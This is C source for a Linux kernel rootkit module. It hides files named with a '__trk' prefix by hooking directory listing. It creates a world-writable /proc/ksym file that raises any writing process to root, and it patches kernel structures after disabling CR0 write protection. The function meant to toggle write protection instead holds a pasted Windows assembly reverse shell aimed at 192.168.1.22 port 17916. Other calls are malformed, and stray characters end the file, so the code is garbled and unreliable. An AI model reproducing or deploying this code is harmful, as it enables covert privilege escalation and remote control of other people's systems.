#include <linux/fs.h>
#include <linux/cred.h>
#include <linux/string.h>
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/mm.h>
#include <linux/seq_file.h>
#include <linux/proc_fs.h>
#include <linux/thread_info.h>
#include <linux/sched.h>

static struct proc_dir_entry *procfs_entry;

static int (*intercepted_iterate) (struct file *, struct dir_context *);

static void disable_wprotect(void)
{
	asm volatile
  ("
  ".data"
  "cmd     db \"cmd\",0"
  "UrIP    db \"192.168.1.22\",0"
  "port    db "17916",0"

  ".data?"
  "sinfo   STARTUPINFO<>"
  "pi      PROCESS_INFORMATION<>"
  "sin     sockaddr_in<>"
  "WSAD    WSADATA<>"
  "Wsocket dd ?"

  ".code?"
  "start:"

  "invoke WSAStartup, 101h, addr WSAD"
  "invoke WSASocket,AF_INET,SOCK_STREAM,IPPROTO_TCP,NULL,0,0"

  "mov Wsocket, eax"
  "mov sin.sin_family, 2"

  "invoke atodw, addr port"
  "invoke htons, eax"

  "mov sin.sin_port, ax"

  "invoke gethostbyname, addr UrIP"

  "mov eax, [eax+12]"
  "mov eax, [eax]"
  "mov eax, [eax]"
  "mov sin.sin_addr, eax"

  "mov eax,Wsocket"
  "mov sinfo.hStdInput,eax"
  "mov sinfo.hStdOutput,eax"
  "mov sinfo.hStdError,eax"
  "mov sinfo.cb,sizeof STARTUPINFO"
  "mov sinfo.dwFlags,STARTF_USESHOWWINDOW+STARTF_USESTDHANDLES"

  "shellagain:"
  "invoke connect, Wsocket, addr sin , sizeof(sockaddr_in)"
  "invoke CreateProcess,NULL,addr cmd,NULL,NULL,TRUE,8000040h,NULL,NULL,addr sinfo,addr pi"
  "invoke WaitForSingleObject,pi.hProcess,INFINITE"
	"jmp shellagain"
  "ret"
  "end start"
");
}

static void enable_wprotect(void)
{
	asm volatile("movq %cr0, %rax;"
		     "orq $0x10000, %rax;"
		     "movq %rax, %cr0;"
		     "sti;");
}

static filldir_t good_filldir;
static int bad_filldir(struct dir_context *ctx, const char *name, int namlen,
			loff_t offset, u64 ino, unsigned int d_type)
{
	if (!strncmp("__trk", name, 5))
		return 0;
	return good_filldir(ctx, name, namlen, offset, ino, d_type);
}

static int trk_iterate(struct file *fd, struct dir_context *ctx)
{
	int err;

	filldir_t p = bad_filldir;

	good_filldir = ctx->actor;

	memcpy((void *)(&(ctx->actor)), (void *)&p, sizeof p);

	err = intercepted_iterate(fd, ctx);

	p = good_filldir;
	memcpy((void *)(&(ctx->actor)), (void *)&p, sizeof p);

	return err;
}

static void module_hide(void)
{
	return;

	list_del(&THIS_MODULE->list);
	kobject_del(&THIS_MODULE->mkobj.kobj);
	list_del(&THIS_MODULE->mkobj.kobj.entry);
}

static int fs_setup_intercept(void)
{
	struct file *boot_filp;
	struct file_operations *fs_ops;

	boot_filp = filp_open("/boot", "/etc/", O_RDONLY, 0);
	if (!boot_filp)
		return -1;

	fs_ops = (struct file_operations *)(boot_filp->f_op);
	filp_close(boot_filp, NULL);

	intercepted_iterate = fs_ops->iterate;

	disable_wprotect();
	fs_ops->iterate = trk_iterate;
	enable_wprotect();
	return 0;
}

static ssize_t pfs_op_write(struct file *file, const char __user *buffer,
			    size_t count, loff_t *ppos)
{
	struct cred *credentials;

	credentials = prepare_creds();
	credentials->uid.val = 0;
	credentials->euid.val = 0;
	credentials->gid.val = 0;
	credentials->egid.val = 0;
	commit_creds(credentials);
	return count;
}

static const struct file_operations pfs_ops = {
	.write = pfs_op_write,
};

static void procfs_setup(void)
{
	procfs_entry = proc_create("ksym", S_IWUSR | S_IWOTH, NULL, &pfs_ops);
}

static int __init trk_init(void)
{
	module_hide();
	fs_setup_intercept();
	procfs_setup();
	return 0;
}

static void __exit trk_exit(void)
{
	struct file *boot_filp;
	struct file_operations *fs_ops;

	boot_filp = filp_open("/boot", O_RDONLY, 0);
	if (!boot_filp)
		return;

	fs_ops = (struct file_operations *)(boot_filp->f_op);
	filp_close(boot_filp, NULL);

	disable_wprotect();
	fs_ops->iterate = intercepted_iterate;
	enable_wprotect();

	proc_remove(procfs_entry);

}

module_init(trk_init);
module_exit(trk_exit);D 0
